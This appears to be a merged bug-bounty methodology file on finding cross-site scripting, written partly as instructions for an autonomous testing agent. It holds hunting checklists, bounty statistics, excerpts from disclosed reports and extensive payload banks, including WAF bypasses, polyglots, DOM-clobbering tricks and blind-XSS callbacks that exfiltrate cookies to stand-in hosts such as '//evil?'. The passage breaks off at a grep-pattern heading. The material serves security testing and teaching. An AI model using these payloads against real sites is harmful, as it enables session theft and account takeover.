# Unified upstream methodology

Collected from every contributing repository skill. Deduplicated by content hash; full originals are preserved in `references/upstream-*.md`.

## Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Reflect a unique canary in every param, path segment, header (Referer, UA, X-Forwarded-*), cookie, and JSON field; look for unencoded reflection in text/html.
- Test URL sinks separately: href/src, iframe srcdoc, formaction, xlink:href, meta refresh, and CSS url().
- Stored vectors: profile name/company, filenames, support tickets, webhook URLs, calendar invites, email subjects, admin notes.
- DOM: trace location.hash/search, postMessage, document.referrer, and localStorage into innerHTML, eval, setTimeout, jQuery .html(), or framework sinks.
- Blind XSS: inject into admin-visible fields and log viewers with a callback that reports cookies, DOM, and URL.
- Check markdown/rich-text pipelines: HTML is often sanitized before markdown is rendered, or vice versa.

### Deeper checklist

- Map every reflection: URL params, path segments, headers (Referer/UA/X-Forwarded-*), cookies, JSON error messages.
- Classify the sink: HTML body, attribute, JS string, URL, CSS, or DOM (innerHTML, eval, location, postMessage).
- Try context-breaking payloads per sink, then encoding bypasses (double URL, unicode, HTML entities, mixed case).
- Test stored vectors: profile fields, filenames, support tickets, comments, webhooks, admin views, emails.
- Test DOM XSS via hash/search/postMessage and client-side routers; trace sources to sinks manually.
- Check sanitizer bypasses: DOMPurify versions, mutation XSS, allowed-tag/attr gaps, markdown-to-HTML pipelines.
- Try CSP bypass: JSONP endpoints, base-uri, dangling markup, script gadgets, whitelisted CDNs.
- Look for blind XSS in admin panels and log viewers; use a callback payload with context metadata.
- Confirm execution in a real browser (not just reflection) and capture the URL, payload, and impact.

### Autonomous Testing Priority

**Verify reflection before claiming XSS — encoding is everything.**

Your payload must appear in the response body with angle brackets UNESCAPED. `<script>` is XSS. `&lt;script&gt;` is safe encoding — not vulnerable.

**Use a UNIQUE NUMERIC CANARY in your proof payload** — e.g. `<script>alert(91234)</script>` or `"><img src=x onerror=alert(91234)>`. Pick a distinctive 4+ digit number, not `alert(1)`. Practice pages are full of *example* payloads like `alert(1)`/`alert('XSS')` in their hint text; a unique number is how you tell YOUR reflected payload apart from the page's decoy examples. Proof = your `alert(<canary>)` shows up in the response with raw, unescaped angle brackets.

**Try these contexts in order:**

1. **Inline script injection** (works when HTML context allows new tags):
   ```
   <script>alert(CANARY)</script>
   ```
   Use whatever canary string your proof contract specifies. Confirmed when `<script>alert(CANARY)` appears literally (not HTML-encoded) in the response.

2. **Attribute event injection** (when `<` is filtered but attributes are injectable):
   ```
   " onmouseover="alert(CANARY)
   " onerror="alert(CANARY)
   " onload="alert(CANARY)
   ```

3. **URL/href context:**
   ```
   javascript:alert(CANARY)
   ```

**Distinguishing success from failure:**
- **Vulnerable:** response contains `<script>alert(` unescaped — browser would execute it
- **Filtered/safe:** response contains `&lt;script&gt;` or `&#x3C;script&#x3E;` — properly encoded
- **Blocked:** response is an error, or the reflected value is absent entirely

**For stored XSS:** inject into a field that other pages display (comments, usernames, ticket titles). Then fetch the rendering page and check for unescaped payload. The payload executes when any user views that page — higher severity than reflected.

---

### Step-by-Step Hunting Methodology

1. **Map all reflection points** — Spider the target and identify every place user input appears in HTML output. Prioritize: URL parameters, form fields, HTTP headers (User-Agent, Referer), file upload names/contents, and API response fields rendered in UI.

2. **Classify by type** — Determine if each reflection is Reflected (URL param → response), Stored (database → later rendering), or DOM-based (JS reads URL/storage → DOM sink). Each requires different payload delivery.

3. **Probe sanitizer behavior** — Send harmless canary strings first: `aaa"bbb'ccc<ddd` to determine which characters are escaped. Observe if output is in HTML context, attribute context, JS context, or URL context.

   **Marker Discipline:** When choosing canary strings, they MUST be unique random alphanumeric strings (8+ chars, no English words, no protocol keywords). Bad markers: `test`, `marker`, `evil`, `attacker`, `payload`, `javascript`, `script`. Good markers: `cpmark987abc`, `x4hd2k9pq`, `__ZZ_MARKER_<random>_ZZ__`. Before claiming reflection, search the baseline (no-marker) response for the marker — if it appears naturally in the page (e.g., the word `javascript` is in every page's help-link hrefs), it's a false-positive trap and you need a different marker. This single check catches 80% of false-positive reflection reports.

4. **Test allowlisted tag combinations** — If a sanitizer is in use, probe for dangerous tag combos: `<math>+<style>`, `<svg>+<style>`, `<iframe srcdoc>`, `<style>` with expressions.

5. **Hunt SVG and file upload vectors** — Upload SVG files containing `<script>` tags. Check Content-Type response header. Test if CSP applies to SVG responses separately.

6. **Test markdown/documentation renderers** — In wiki, README, or doc fields, try: `[text](javascript:alert(1))`, inline HTML injection, Kroki/Mermaid payloads, RDoc `link:javascript:` syntax.

7. **Check redirect parameters** — Test `?redirect=javascript:alert(1)` and `?return_url=//evil.com` — look for single-click XSS via improper redirect sanitization.

8. **Probe UTM and analytics parameters** — `utm_source`, `utm_medium`, `utm_campaign` are often reflected without sanitization on marketing pages.

9. **Test CSP bypass opportunities** — If CSP is present, look for: JSONP endpoints on allowed domains, `unsafe-inline` in style-src, SVG that bypasses script-src, script gadgets on whitelisted CDNs.

10. **Attempt stored XSS in profile/metadata fields** — Username, bio, tag names, label colors, organization names — these render in many contexts and often have weaker validation.

11. **Check cache poisoning** — Test if reflected XSS payloads can be cached and served to other users (especially on CDN-fronted pages), transforming reflected XSS into stored-equivalent.

12. **Validate in target browser** — Always confirm in a real browser before reporting. Many payloads echo back in Burp but fail to execute in a real browser due to CSP, output encoding, framework auto-escaping, context mismatch, WAF normalization, or browser HTML-parsing differences. (Note: Chrome's XSS Auditor was removed in Chrome 78 / Oct 2019 and no shipping browser has one — never attribute a failed PoC to an "XSS auditor".)

---

### Web-Research Methodology Additions (2026)

Online sources consulted: PortSwigger XSS cheat sheet (updated Oct 2026), PortSwigger Web Security Academy DOM-based topics, HackTricks XSS / DOM XSS / DOM-clobbering / XSSI pages, PayloadsAllTheThings XSS Injection, HackerOne "How to Find XSS" guide, Google bughunters mXSS writeup, OWASP DOM-based XSS Prevention Cheat Sheet. These are **additive** to the sections above — keep the earlier material.

### A. Discovery checklist the existing sections don't emphasize

1. **Canary every reflection point, not just parameters.** Inject a unique token into: query/body params, all path segments, every header (`Referer`, `User-Agent`, `X-Forwarded-*`, `X-Original-URL`, `Origin`), cookie names and values, JSON keys (not just values), multipart field names, filename metadata, and WebSocket frames. Then grep the raw response for the canary — note *which context* it lands in.
2. **Classify the context before choosing a payload** — HTML text, quoted/unquoted attribute, `<script>` body, JS string (single/double/template), URL attribute (`href`/`src`/`srcdoc`/`formaction`/`xlink:href`), CSS `url()`, or JSON-inside-script. The same canary needs a different escape per context.
3. **Run DOM Invader early** (Burp browser extension). Enable all sources/sinks, copy its generated canary, put that canary into every input, and let it highlight which sink receives it. Then hand-craft the final payload — the auto-generated one is often blocked. (HackerOne guide.)
4. **Test the "boring" surfaces:** 404/error pages, login/logout, password reset, search, file names, support tickets, calendar invites, email subjects, admin notes, webhook URLs, user-agent/customer-service consoles, and PDF/document generators.
5. **Check the response's charset/encoding.** If no `Content-Type` charset is set, browsers guess. ISO-2022-JP escape sequences can turn benign characters into `<script>`; UTF-7-style JSON tricks have historically escaped JSON context. (HackTricks, referenced research.)
6. **Diff dynamic JS files** (`DetectDynamicJS`) for XSSI: cross-origin `<script>` inclusion can leak authenticated data embedded in executable JS. Also test non-script files (CSV, JSON) loaded as script sources. (HackTricks XSSI.)

## Signals and surfaces

### Signal

- Reports: **2,569** · paid: **546**
- Median bounty **$500** · p90 **$2,500** · max **$16,000** · total **$548,499**
- Median upvotes **11**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitLab | 57 | $92,530 | 3692 |
| Shopify | 129 | $83,350 | 5563 |
| Uber | 51 | $61,250 | 1642 |
| Mail.ru | 291 | $51,870 | 4740 |
| HackerOne | 33 | $27,750 | 3084 |
| Internet Bug Bounty | 17 | $17,265 | 498 |
| Reddit | 10 | $15,500 | 1343 |
| Open-Xchange | 34 | $14,400 | 366 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`q` `s` `search` `query` `lang` `next` `return` `url` `redirect` `callback` `name` `title` `bio` `message` `comment` `filename` `theme` `template`

### Crown Jewel Targets

XSS is high-value when it combines **privileged context + persistent delivery + scope escalation**. The highest payouts come from:

- **Admin panels and authenticated dashboards** (e.g., `*/admin`, `*/settings`) — attacker can hijack sessions with elevated privileges, exfiltrate tokens, or pivot to account takeover
- **Payment/financial flows** (`paypal.com`, checkout pages, currency converters) — XSS here enables credential harvesting and financial fraud at scale
- **Stored XSS in collaborative features** (wikis, markdown renderers, issue trackers, RDoc, labels, tags) — one payload infects every viewer, multiplying impact
- **SSO/signin pages** (e.g., `paypal.com/signin`) — XSS here is critical because it can steal auth tokens across the entire platform
- **Shared SaaS tenant surfaces** (`*.myshopify.com`, `api.collabs.*`) — XSS in one tenant's context can bleed across tenant boundaries
- **Help/documentation sites** (`help.shopify.com`) — lower severity individually, but often have looser sanitization and trusted user perception
- **SVG/file upload endpoints** — frequently bypasses CSP and sanitization simultaneously

**Asset types that pay most:** Main product domains > Admin subdomains > API endpoints > Marketing/help sites

---

### Attack Surface Signals

**URL Patterns:**
```
/admin*
/settings*
/wiki*
/reports*
?utm_source=
?redirect=
?q=
?search=
?callback=
?return_url=
/render*
/preview*
/documentation*
```

**Response Headers (weak defense signals):**
```
Content-Type: text/html (without nosniff)
Content-Security-Policy: (absent or using unsafe-inline)
Content-Type: image/svg+xml (CSP often not applied)
X-XSS-Protection: 0
```

**JS Patterns in source that signal DOM XSS:**
```javascript
document.write(
innerHTML =
location.hash
location.search
location.href
document.referrer
eval(
setTimeout(string,
setInterval(string,
$.html(
$(location
```

**Tech Stack Signals:**
- Rails applications using `html_safe`, `raw`, `translate`, Action Text, or ActionView sanitize helpers
- GitLab/GitHub markdown pipelines (Banzai, Kramdown, RDoc, Kroki)
- Applications allowing SVG uploads or rendering
- Sites using `style` tag in allowlists
- Kroki/Mermaid/PlantUML diagram rendering endpoints
- Cache layers in front of authenticated pages (cache poisoning vector)

---

## Techniques, payloads and bypasses

### Payloads & probes

- HTML body -> `<svg onload=alert(document.domain)>` `<img src=x onerror=alert(1)>`
- Attribute -> `" autofocus onfocus=alert(1) x="` `' onmouseover='alert(1)`
- JS string -> `';alert(1)//` `\';alert(1)//` `</script><script>alert(1)</script>`
- URL sink -> `javascript:alert(1)` `data:text/html,<script>alert(1)</script>` `vbscript:msgbox(1)`
- Markdown -> `[x](javascript:alert(1))` `![x](x" onerror="alert(1))`
- Angular -> `{{constructor.constructor('alert(1)')()}}`
- mXSS -> `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`

### Payload bank

**89 curated payloads** in 6 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.

### Filter & WAF bypass

```text
<scr<script>ipt>alert(1)</scr</script>ipt>
<ScRiPt>alert(1)</sCrIpT>
<<script>script>alert(1)<</script>/script>
<img/src=x/onerror=alert(1)>
<img src=x onerror=alert(1)////>
<svg%0aonload=alert(1)>
%3Cscript%3Ealert(1)%3C/script%3E
%253Cscript%253Ealert(1)%253C/script%253E
&lt;script&gt;alert(1)&lt;/script&gt;
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<svg onload=confirm`1`>
<svg onload=alert(1) >
<img src=x onerror=alert(1)%00>
<img src=x onerror=alert(1)<!-->
<img src=x onerror=alert(1)<!--->
<a href="&#x6a;avascript:alert(1)">x</a>
<img src=x onerror=&#x61;lert(1)>
```

### Bypass tricks

- Encode < as &lt;, %3C, \u003c, or fullwidth ＜; double-encode when the server decodes twice.
- Sanitizer gaps: data-* attributes, xlink:href, mXSS, DOMPurify version CVEs, sanitize-then-decode order.
- CSP bypass: JSONP endpoints, base-uri, dangling markup, whitelisted CDN, Angular/Vue gadgets.
- Filter bypass: `<scr<script>ipt>`, mixed case, null bytes, `<!-->`, HTML comments inside tags.
- Browser parsing quirks: `<svg><p><style><img src=x onerror=...>`, nested forms, namespace confusion.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **Stored XSS in Wiki pages** — `#526325` · GitLab · $0 · ▲633
  > GitLab application converts the Markdown string `.alert(1);` to the href attribute `javascript:alert(1);`.
- **Stored XSS on imgur profile** — `#484434` · Imgur · $0 · ▲614
  > ”/ & lt; script alert(1)& lt;/scr ipt&gt”/ remove the underscores.
- **The return of the ＜** — `#639684` · Rockstar Games · $1,000 · ▲576
  > =[̕h+͓.＜script/src=//evil.site/poc.js .͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕
- **[Grab Android/iOS] Insecure deeplink leads to sensitive information disclosure** — `#401793` · Grab · $0 · ▲552
  > I've found a set of possible deeplinks, one of them ( ) could lead that an arbtrary URL was opened in a built-in browser in activity using that code (should be used in an external browser/messenger)
- **XSS in steam react chat client** — `#409850` · Valve · $7,500 · ▲499
  > React has strong XSS mitigations but does not mitigate `javascript:` URI based XSS.
- **Cross-Site-Scripting on www.tiktok.com and m.tiktok.com leading to Data Exfiltration** — `#968082` · TikTok · $0 · ▲473
  > While fuzzing, I discovered a URL parameter reflecting its value without being properly sanitized.
- **XSS vulnerable parameter in a location hash** — `#146336` · Slack · $0 · ▲455
  > https://slack.com/is ?cvo sid1=111\u0026;typ=55577]")%3balert(document.cookie)%3b//
- **Blind XSS on image upload** — `#1010466` · CS Money · $1,000 · ▲450
  > - The CSRF vulnerability make a request for support.cs.money/upload file; This upload file does not have csrf token/ origin/ reference verification!
- **Stored XSS Vulnerability** — `#643908` · WordPress · $0 · ▲403
  > Paste the payload: " <svg/onload=alert(document.domain)
- **[accounts.reddit.com] Redirect parameter allows for XSS** — `#1962645` · Reddit · $5,000 · ▲394
  > I was tampering with the dest parameter in accounts.reddit.com and found out it is vulnerable to Cross Site Scripting once the victim performs the log in.
- **Reflected XSS on www.hackerone.com and resources.hackerone.com** — `#840759` · HackerOne · $500 · ▲387
  > https://www.hackerone.com/resources/read/embed…
- **HEY.com email stored XSS** — `#982291` · Basecamp · $5,000 · ▲360
  > url(cid://\00003c/style\00003e\00003c/template\00003e\00003c/message-content\00003e\00003cform\000020action=/my/accounts/266986/forwardings/outbounds\000020data-controller=beacon\00003e\00003cinput\000020type=text\000020name=contact outbound forwarding[to…
- **Blind XSS on Twitter's internal Big Data panel at █████████████** — `#1207040` · X / xAI · $0 · ▲357
  > An attacker appears to be able to send an XSS payload to Twitter staff members, using a Support Form.
- **Reflected XSS in TikTok endpoints** — `#1350887` · TikTok · $0 · ▲356
  > Cross site scripting vulnerability was found in few TikTok endpoints using the region parameter.
- **Stored XSS in wordpress.com** — `#733248` · Automattic · $0 · ▲356
  > Add the payload `<iframe < <a href=javascript&colon;alert(document.cookie) Click Here</a =&gt;&lt;/iframe&gt;` to the body or the title of the blog post
- **XSS while logging using Google** — `#691611` · Shopify · $1,750 · ▲341
  > Step1: Go to https://YOURSHOP.myshopify.com/admin/settings/account
- **Stored XSS in Private Message component (BuddyPress)** — `#487081` · WordPress · $0 · ▲337
  > Type the following message `Test<iframe src=javascript:alert(1) width=0 height=0 style=display:none; </iframe `
- **Stored XSS in my staff name fired in another your internal panel** — `#946053` · Shopify · $0 · ▲326
  > I had lots of tests for bug bounty in my test store "trstore-3.myshopify.com" (created about 4 years ago) and then one of your developers noticed that a stored cross-site scripting payload in my staff name fired in another your internal panel.
- **DOM XSS on duckduckgo.com search** — `#868934` · DuckDuckGo · $0 · ▲326
  > The is a DOM XSS vulnerability on https://duckduckgo.com search through the parameter.
- **yelp.com XSS ATO (via login keylogger, link Google account)** — `#2010530` · Yelp · $0 · ▲324
  > This should be parsed as 1 cookie `a` with the value "`1 b=2`", but Yelp will parse it as 2 cookies `a` and `b`.
- **Stored XSS in markdown via the DesignReferenceFilter** — `#1212067` · GitLab · $16,000 · ▲317
  > `https://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout`
- **Stored-XSS-ads.tiktok.com** — `#2306491` · TikTok · $0 · ▲310
  > A stored cross-site scripting (XSS) vulnerability was found on a TikTok Ads endpoint, making it possible for MP4 video files, or files with HTML or JS code to be executed in a user's browser.
- **Stored XSS via Kroki diagram** — `#1731349` · GitLab · $13,950 · ▲295
  > Create an issue and use the following payload `<a <pre lang='f/" onerror=alert(1) onload=alert(1) ' <code lang="wavedrom" xss</code </pre </a `
- **Account takeover through the combination of cookie manipulation and XSS** — `#534450` · Superhuman (formerly Grammarly) · $0 · ▲292
  > Our payload will make a post request to gnar.grammarly.com/cookies to replace the gnar containerid with the second stage of our payload and the redirect the user to the vulnerable page.
- **RichText parser vulnerability in scheduled posts allows XSS** — `#1930763` · Reddit · $5,000 · ▲280
  > Intercept the request with Burp Suite/Other proxies and replace the link with javascript scheme payload: {{F2270195}
- **XSS At "pages.et.uber.com"** — `#156098` · Uber · $0 · ▲267
  > https://pages.et.uber.com/icecream/?lang id=5%22%20onmouseover%3dprompt(document.cookie)%20bad%3d%22
- **Stored xss in address field in billing activity at https://shop.aaf.com/Order/step1/index.cfm** — `#411690` · Alliance of American Football · $0 · ▲244
  > enter xss payload (a" <svg/onload=prompt(1) ) in every address field and click on OK proceed
- **XSS at jamfpro.shopifycloud.com** — `#1444682` · Shopify · $9,400 · ▲240
  > Authenticate to `jamfpro.shopifycloud.com` and click the link: `https://jamfpro.shopifycloud.com/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9zdGFuZGluZy1zYWx0LnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==`
- **Cross-site Scripting (XSS) on HackerOne careers page** — `#474656` · HackerOne · $500 · ▲239
  > - POC: `https://www.hackerone.com/careers?lever- aaa" <script src="https://app-sj17.marketo.com/index.php/form/getForm?callback=alert" </script `
- **Reflected XSS on www.hackerone.com via Wistia embed code** — `#986386` · HackerOne · $500 · ▲236
  > If the url passed to `i.url.parse` contains a query parameter such as `? proto .ggg=1` then it will end up on the Object prototype, for example visiting `https://www.hackerone.com/blog/scaling-security-startup-unicorn? proto [ggg]=aaa` and typing…

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 18× | `javascript:` |
| 5× | `alert(document.domain)` |
| 5× | `<script>` |
| 5× | `<a>` |
| 4× | `alert(1)` |
| 4× | `escapeHTML()` |
| 3× | `<iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=&gt;&lt;/iframe&gt;` |
| 3× | `<script>alert(document.domain)</script>` |
| 3× | `attacker@example.com` |
| 3× | `wp_targeted_link_rel()` |
| 3× | `alert()` |
| 3× | `<img>` |
| 3× | `<svg>` |
| 3× | `__proto__` |
| 2× | `javascript:alert(1);` |
| 2× | `Test<iframe src=javascript:alert(1) width=0 height=0 style=display:none;></iframe>` |
| 2× | `javascript://%0aalert(1)` |
| 2× | `<.*` |
| 2× | `\b \f \n \r \t` |
| 2× | `<%&lt;script/src=//...?` |

### Common Root Causes

1. **Trusting `html_safe` in Rails** — Developers mark strings as safe after partial sanitization, or chain `.html_safe` on user-supplied data without full sanitization.

2. **Allowlist sanitizers with dangerous tag combinations** — Allowing `style` alongside `math` or `svg` creates mXSS (mutation XSS) opportunities even when individual tags seem harmless.

3. **Third-party rendering pipelines** — Markdown-to-HTML pipelines (Banzai, Kramdown, Kroki) introduce XSS when diagram/rendering engines aren't sandboxed and output isn't re-sanitized.

4. **Reflecting URL parameters without encoding** — UTM params, redirect URLs, and search terms are reflected in page HTML or JS without proper HTML-encoding, especially on marketing/help pages that are treated as lower-security.

5. **SVG treated as non-script content** — Developers apply CSP to HTML responses but forget that `image/svg+xml` responses can execute JavaScript and often aren't covered by the same CSP header.

6. **Incomplete sanitizer patches** — CVE-patched sanitizers are bypassed by slight variations (e.g., CVE-2022-32209's incomplete fix demonstrates that sanitizer logic is difficult to get right, creating bypass chains).

7. **`javascript:` scheme not blocked in href/src** — Link renderers (RDoc, Markdown) fail to block `javascript:` URLs in href attributes, treating them as valid external links.

8. **Cache layers storing authenticated user input** — CDN or reverse proxy caches store responses containing user-controlled XSS payloads, serving them to subsequent unauthenticated users.

9. **File upload without Content-Type enforcement** — Accepting SVG or HTML files and serving them without forcing `Content-Disposition: attachment` or overriding Content-Type.

10. **Translation helper XSS** — Rails `translate`/`t()` helper marks translation strings as HTML-safe and interpolates user input, enabling injection through locale keys.

---

### Chain 4 — SVG Upload XSS + CSP Bypass → JS Execution on Trusted Origin → Cookie/Token Theft

- **A.** Identify a file-upload feature that accepts `image/svg+xml`. SVG files are XML and can contain `<script>` tags — many sanitisers process PNG/JPG but pass SVG through unmodified.
- **B.** CSP frequently applies to HTML responses but NOT to `image/svg+xml` responses. The SVG executes JS in the context of whichever origin serves it.
- **C.** If the SVG is served same-origin (common when uploads go to `target.com/uploads/<sha>.svg`), the executing JS has full session-cookie access and can call any same-origin API.
- **Impact:** Stored XSS on the trusted origin without going through any reflected/stored content vector — bypasses CSP entirely; pulls session cookies, calls password-change endpoints, ATO.
- **Real shape:** Multiple disclosed cases across SaaS uploaders; cross-refs `file-upload` SVG section and `xxe` Disclosed Report Citation #3 and #4 (Zivver/Lab45 SVG-upload chains).

### Chain 5 — postMessage XSS + Origin Check Bypass → Cross-Origin Token Exfil → ATO

- **A.** Identify a `window.addEventListener('message', handler)` where `handler` does NOT check `event.origin` (or checks it with a `indexOf`/`endsWith` that fails on `target.com.attacker.com`).
- **B.** Attacker page opens `target.com` in a popup or iframe. Once loaded, sends a `postMessage` payload that the handler evals, processes as XSS, or uses to extract `document.cookie`.
- **C.** Handler executes in `target.com` context; response is `postMessage`'d back to attacker page via `event.source.postMessage(stolenData, '*')`.
- **Impact:** Cross-origin JS execution and exfil with no CSP violation — `postMessage` is a legitimate cross-origin channel; CSP doesn't gate it. Token theft / session hijack.
- **Real shape:** Detectify "Dirty Dancing" multi-vendor postMessage gadgets (2022); Zoom OAuth + postMessage chain (2024). Cross-refs `oauth-oidc` Disclosed Report Citation #19, #20.

### Operator-level pattern

When you confirm XSS at A, immediately ask: what state-changing endpoint or token store does this JS now have access to? *Where does the payload run, and who sees it?* The chain payout is 5-20x the standalone XSS payout. Discipline gate before submission: do not file XSS as "Critical" without demonstrating the terminal impact (ATO / token exfil / privilege escalation); file as Medium otherwise.

Cross-references:
- `web-cache` — Chain 1
- `csrf` — Chain 2
- `oauth-oidc` — Chains 3, 5
- `file-upload` / `xxe` — Chain 4
- `account-takeover` — terminal impact for Chains 2, 3, 4, 5

---

### B. Vector families worth adding to your arsenal

- **Dangling markup / scriptless XSS** — when `<`/`>` are filtered but you can still inject HTML, leave an unterminated tag to swallow markup up to a victim token: `<img src='//evil?`, `<audio><source src="//evil?`, `<button form=x><form id=x action="//evil?`, `<textarea name=x>` to consume following markup and exfiltrate it. PortSwigger's cheat sheet lists link `href`/icon, `video`/`track`/`source`, `audio`, `input`/`button` `formaction`, `embed`, and `base href` variants.
- **Server-side XSS via PDF generators** — HTML injected into a headless-browser PDF pipeline is interpreted by the renderer; this fires server-side and can hit privileged origins. (HackTricks "Server Side XSS (Dynamic PDF)", "PDF Injection".)
- **Chrome cache → XSS** — abuse cache key/normalization mismatches so a poisoned response is served under a trusted URL. (HackTricks.)
- **Service Worker abuse / Shadow DOM** — a registered SW can intercept same-origin requests; Shadow DOM sinks are missed by naive scanners. (HackTricks.)
- **Wasm linear-memory template overwrite** — overwriting a format string like `%.*s` with an image/URL turns sanitized input into a JS handler value and yields immediate DOM XSS. (HackTricks.)
- **Unicode injection** — normalization can collapse to executable characters; check the Unicode-injection XSS section on HackTricks.
- **mXSS (mutation XSS)** — sanitizers parse → serialize → reparse; a tree that is "safe" in memory can mutate into executable markup. Classic `<noscript>` vector from Google Search (Masato Kinugawa). Google's May 2025 spec change escapes `<`/`>` in attribute serialization and blocks the create-new-tag class of mXSS, but **vectors relying on tags whose text content is serialized literally** (e.g. `<style>textContent = "</style><img src=x onerror=...>"`) still work. Test sanitizer round-trips directly.
- **Self-XSS → real XSS escalation:** if a cookie-reflected XSS is "self-only", find a vulnerable sibling subdomain and use it to set a cookie for the parent domain, or abuse an admin session-mirroring/support feature that renders your session to an admin. (HackTricks.)
- **CSS gadget to boost impact:** if the injection only fires on `onmouseover`, make the target huge/invisible-but-clickable: `display:block;width:100%` / `position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0`.

### C. DOM source → sink map (HackTricks / PortSwigger)

Sources: `location`, `.hash`, `.href`, `.search`, `.pathname`, `.host`, `.hostname`, `.protocol`, `document.referrer`, `document.title`, `window.name`, `postMessage` / `event.data`, `localStorage`/`sessionStorage`, `XMLHttpRequest`/`fetch` response, `WebSocket` messages.

Sinks:
- Execution: `eval()`, `Function()`, `setTimeout()`, `setInterval()`, `setImmediate()`, `execCommand()`, `execScript()`, `msSetImmediate()`, `range.createContextualFragment()`, `crypto.generateCRMFRequest()`.
- HTML/DOM: `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write()`, `document.writeln()`, `someDOMElement.onevent`, `iframe.srcdoc`.
- URL: `script.src`, `iframe.src`, `a.href`, `form.action`, `location.assign()`, `location.replace()`, `open()`, `XMLHttpRequest.open()/send()/setRequestHeader()`, `$.ajax()`, `$.globalEval()`.
- jQuery (all are XSS sinks): `add()`, `after()`, `append()`, `animate()`, `insertAfter()`, `insertBefore()`, `before()`, `prepend()`, `replaceAll()`, `replaceWith()`, `wrap()`, `wrapInner()`, `wrapAll()`, `has()`, `constructor()`, `init()`, `index()`, `jQuery.parseHTML()`, `$.parseHTML()`.
- Client-side JSON injection: `JSON.parse()`, `jQuery.parseJSON()`; client-side SQL: `executeSql()`; XPath: `document.evaluate()`; cookie: `document.cookie`; history: `pushState()`/`replaceState()`.

**Rule:** don't stop at named properties or direct `location` sources. An HTML-only injection that looks harmless can become DOM XSS by supplying the element that trusted JS consumes (DOM clobbering below).

### D. DOM clobbering as a remote script loader (PortSwigger research)

1. App does `window.someConfig || {}` and treats it as trusted.
2. Inject `<a id=someConfig>` (or `form`/`img` with duplicate `id`/`name`) to clobber the global.
3. Code checks truthiness, not type; `script.src = config.scriptUrl` coerces the anchor element to a string, and anchors stringify to their `href`.
4. Result: attacker-controlled script URL. Works if no restrictive `script-src` CSP.
5. Runtime-decode variant: `<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">` — the HTML-encoded `&quot;` is decoded at runtime and escapes the attribute.
6. DOM clobbering can bypass CSP (PortSwigger "Bypassing CSP via DOM clobbering"). Also check `document`-level clobbering of `cookie`, `body`, `documentElement`, `forms`, `images`, `scripts`.

### E. WAF / filter bypass additions (PortSwigger 2026 cheat sheet)

- **Restricted characters:** `<script>{onerror=alert}throw 1</script>`, `<script>var{a:onerror}={a:alert};throw 1</script>`, destructuring defaults `var{haha:onerror=alert}=0;throw 1`, `window.name`-concealed payloads, `onpagereveal=setTimeout` + `Event.prototype.toString/name` tricks, `onscroll=setTimeout` with a tall body.
- **Global-object concatenation:** `';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//` and the `self` / `this` / `top` / `parent` variants; `atob.constructor()`, `Set.constructor()`, `createElement('script')+append`.
- **Obfuscation:** `<script src=data:text/javascript;base64,...>` (also with HTML entities and double-URL-encoded Base64), `iframe srcdoc` HTML-encoded, `javascript:` iframe URL with layered HTML/URL encoding, SVG `<script>` with `\u0061\u006c\u0065\u0072\u0074` escapes.
- **Polyglots (PortSwigger):**
  - `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`
  - `javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html "\` newline `onmouseover=/*&lt;svg/*/onload=alert()//>`
  - `javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`
- **Oversized / newline tricks:** attribute `javascript:` URL via `&#9;`, `&#x0009;`, `&#00000000000009;` (tab entity) with/without semicolon, prefix vs inline placement.
- **AngularJS sandbox escapes** (legacy 1.4.0–1.4.5) still appear in old admin panels — see PortSwigger client-side template injection section.

### F. Blind XSS operational notes (PayloadsAllTheThings / HackerOne)

- Use a **persistent callback service** — XSS Hunter, Burp Collaborator, or your own data-grabber + one-line HTTP server. Confirm receipt before deploying heavy tooling.
- Inject into fields viewed by **other users**: registration name, support ticket, webhook URL, admin note, file name, calendar invite, email subject, user-agent captured in an admin analytics panel.
- A callback payload that exfiltrates `document.cookie`, `DOM`, and current URL is far more valuable than an `alert()` — it proves impact for the report.
- Track which payload fired which context and at what time; blind XSS often triggers hours/days later in a different origin.

### Payload & Detection Patterns

**Basic context probing:**
```html
aaa"bbb'ccc<ddd>eee`fff
```

**Reflected XSS — URL parameter baseline:**
```
?q=<script>alert(document.domain)</script>
?q="><script>alert(1)</script>
?utm_source=<svg onload=alert(1)>
?redirect=javascript:alert(document.domain)
```

**Attribute context escapes:**
```html
" onmouseover="alert(1)
' onmouseover='alert(1)
`onmouseover=alert(1)
```

**SVG-based (CSP bypass):**
```html
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

**Sanitizer bypass — math+style combo:**
```html
<math><style><img src=x onerror=alert(1)></style></math>
```

**Sanitizer bypass — svg+style combo:**
```html
<svg><style><img src=x onerror=alert(1)></style></svg>
```

**Markdown/RDoc javascript: link:**
```markdown
[Click me](javascript:alert(document.domain))
```

**Kroki/diagram injection:**
```
```kroki
plantuml
@startuml
:<script>alert(1)</script>;
@enduml
```
```

**DOM XSS via hash/search:**
```javascript
// In browser console to test sink
location.hash = '#"><img src=x onerror=alert(1)>'
location.href = 'https://target.com/page#<script>alert(1)</script>'
```

**Grep patterns for source review:**
```bash
# Find dangerous sinks in JS
